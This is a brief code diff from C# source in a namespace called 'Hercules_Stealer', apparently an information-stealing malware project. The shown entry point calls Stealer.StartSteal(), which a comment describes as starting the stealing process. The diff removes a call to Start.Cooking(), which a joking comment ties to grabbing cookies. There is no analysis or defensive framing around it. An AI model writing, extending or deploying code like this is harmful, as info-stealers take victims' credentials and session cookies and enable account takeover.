@@ -15,7 +15,6 @@ namespace Hercules_Stealer
                 {
                     //start
                     Stealer.StartSteal(); // Starts stealing process at Stealer.cs on function StartSteal()
-                    Start.Cooking(); // starts Cooking some cookies for you :))
                     Console.WriteLine("Succeed"); // if ran as an console application...
                 }
             }
